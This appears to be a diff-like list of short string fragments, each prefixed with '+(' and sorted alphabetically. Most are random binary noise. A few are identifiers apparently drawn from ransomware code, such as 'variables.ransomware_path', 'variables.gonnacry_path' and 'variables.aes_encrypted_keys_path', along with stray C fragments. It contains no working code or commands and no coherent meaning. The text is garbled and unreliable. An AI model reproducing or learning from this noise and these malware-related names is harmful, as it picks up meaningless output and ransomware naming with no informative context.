+(tA&
+(tFQ}m
+(tN.Wn8L
+(tQ/
+(tZ-#*7z
+(tam + 6
+(tasks
+(td_+&bbN
+(test_path
+(trash
+(twiMo
+(u
+(u'0OJr<
+(u(yt&
+(u6LMMi
+(u9
+(u?ap
+(uB
+(uD
+(uFVr
+(uW
+(uid == NO_UID && 0? NULL: getpwuid(uid
+(unsigned char*
+(ur5
+(username
+(v
+(v#u<d=O
+(v&
+(v>
+(vTyQ2ug
+(variables.aes_encrypted_keys_path
+(variables.daemon_path
+(variables.gonnacry_path
+(variables.home
+(variables.ransomware_path
+(variables.test_path
+(void
+(vsv{]9
+(vxY2%K=
+(vy:Z[]tV'598
+(w
+(w3xY6m
+(w72xY6m
+(wO&F/
+(wW
+(wXPY~
+(wY
+(wZ
+(w[
+(wb
+(which makes passes at compilers
+(with potential passwords
+(wjT]
+(wmWg.
+(wq
+(x
+(x.X
+(x1W}Y
+(x8}
+(xB
+(xP
+(xV
+(xXNf
+(xfce
+(xfce1
+(xjVJJ	(
+(xp@5
+(xv
+(y
+(y+
+(y>eu!$!p
+(y>eu!V'!pt
+(y?Y=	w
+(y_
+(yz *}ow`
+(z
+(z'sF
+(z(%j
+(zIa
+(zNbr
+(zRU#ooR.
+(zX
+(z[|w
+(zk4z
+(zl@
+(ztE+
+(ztm<;T1y*(!
+({
+({4
+({8qo(
+({;*'jeN!_
+({<4@G?
+({>f
+({@_
+({Jv
+({O4
+({Xx
+({[
+({c4/
+({fA6
+({v3Z'4
+(|
+(|$BA
+(|%rjN
+(|0E>
+(|8
+(|T
+(|V^
+(|c8^
+(|jWV
+(|n-dblY
+(|wO
+(}
+(}'
+(}* ~1DBuTQ
+(}:D
+(};o
+(}<[
+(}>K_7
+(}G
+(}QnHp
+(}c%hp
+(}fu>
+(}i
+(}qM+
+(}q^
+(}s
+(}t
+(~
+(~#W
+(~&1 >
+(~(
+(~.]!
+(~0$4
+(~7(cP
+(~<>g
+(~<m
+(~B
+(~Gb=Cf[_
+(~TX3
+(~lVX
+(~q}
+(~r
+(~t
+(~yd:
